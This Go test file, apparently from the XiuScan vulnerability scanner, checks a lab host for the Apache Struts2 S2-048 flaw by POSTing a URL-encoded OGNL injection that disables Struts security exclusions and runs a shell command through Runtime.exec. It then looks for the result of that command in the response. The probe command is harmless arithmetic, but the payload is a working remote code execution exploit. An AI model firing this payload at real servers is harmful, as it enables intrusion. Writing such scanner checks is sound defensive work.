package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"net/url"
	"strconv"
	"strings"
	"testing"
)

func TestS2048(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ * __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	cmd = url.QueryEscape(cmd)
	payload := "name=1%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_" +
		"MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D" +
		"%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymph" +
		"ony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%2" +
		"3container.getInstance%28%40com.opensymphony.xwork2.ognl.Ognl" +
		"Util%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%2" +
		"9.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%" +
		"28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%2" +
		"3q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lan" +
		"g.Runtime%40getRuntime%28%29.exec%28%27__cmd__%27%29.getInputStr" +
		"eam%28%29%29%29.%28%23q%29%7D&age=1&__checkbox_bustedBefore=true" +
		"&description="
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	output := tool.FormatPayload(payload)
	headers := make(map[string]string)
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	log.Info("payload: %s", output)
	req := &http.Request{
		Url:     http.NewUrl("http://192.168.222.132:8080/integration/saveGangster.action"),
		Method:  "POST",
		Body:    payload,
		Headers: headers,
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-048")
	}
}
